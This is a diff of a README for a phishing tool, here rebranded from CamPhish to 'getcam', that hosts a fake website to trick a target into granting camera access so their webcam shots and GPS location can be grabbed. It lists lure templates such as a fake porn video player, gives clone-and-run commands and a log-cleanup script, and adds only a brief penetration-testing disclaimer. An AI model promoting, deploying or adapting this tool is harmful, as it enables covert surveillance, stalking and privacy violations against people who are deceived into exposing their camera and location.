@@ -1,12 +1,12 @@
-# CamPhish
+# getcam
 Grab cam shots from target's phone front camera or PC webcam just sending a link.
 # license
-This project is based on camphish by techchipnet.
+This project is based on getcam by techchipnet.
 Modified by zahwan.
 Licensed under GNU GPL v3.
 
-# What is CamPhish?
-<p>CamPhish is techniques to take cam shots of target's phone front camera or PC webcam. CamPhish Hosts a fake website on in built PHP server and uses ngrok & CloudFlare Tunnel to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device
+# What is getcam?
+<p>getcam is techniques to take cam shots of target's phone front camera or PC webcam. getcam Hosts a fake website on in built PHP server and uses ngrok & CloudFlare Tunnel to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device
 
 A GPS location capture feature has been added.</p>
 
@@ -16,7 +16,7 @@ A GPS location capture feature has been added.</p>
   <li>Festival Wishing</li>
   <li>Live YouTube TV</li>
   <li>Online Meeting</li>
-  <li>Porntrick — Video player disguise with auto camera capture [beta]</li>
+  <li>porn web — Video player disguise with auto camera capture [beta]</li>
   <li>GPS Location Tracking</li>
 </ul>
 <p>A cleanup script has been added to remove all unnecessary files and logs.</p>
@@ -42,9 +42,9 @@ apt-get -y install php wget unzip
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/techchipnet/CamPhish
-cd CamPhish
-bash camphish.sh
+git clone https://github.com/Empy-ai09/gett-all-camera
+cd gett-all-camera
+bash getcam.sh
 ```
 
 ## Clean logs & unnecessary files :
@@ -56,7 +56,7 @@ bash cleanup.sh
 
 ## Change Log:
 
-<p><b>Version: 3.0:</b> Added Porntrick template with video player disguise and auto camera capture</p>
+<p><b>Version: 1.0:</b> Added Porntrick template with video player disguise and auto camera capture</p>
 <ul>
   <li>Added: New "porntrick" template — fake video player (CloudDrive) that captures camera photos</li>
   <li>Added: Camera permission popup with warning message before video playback</li>
@@ -76,6 +76,6 @@ bash cleanup.sh
 ### Important Notice
 Unauthorized reuploading of this project is prohibited.
 
-#### For More Video subcribe <a href="http://youtube.com/techchipnet">TechChip YouTube Channel</a>
-<p>CamPhish is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
-<p>CamPhish is inspired by https://github.com/thelinuxchoice/ Big thanks to @thelinuxchoice</p>
+#### For More Video check <a href="http://youtube.com/techchipnet">TechChip YouTube Channel</a>
+<p>getcam is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
+<p>getcam is inspired by https://github.com/thelinuxchoice/ Big thanks to @thelinuxchoice</p>
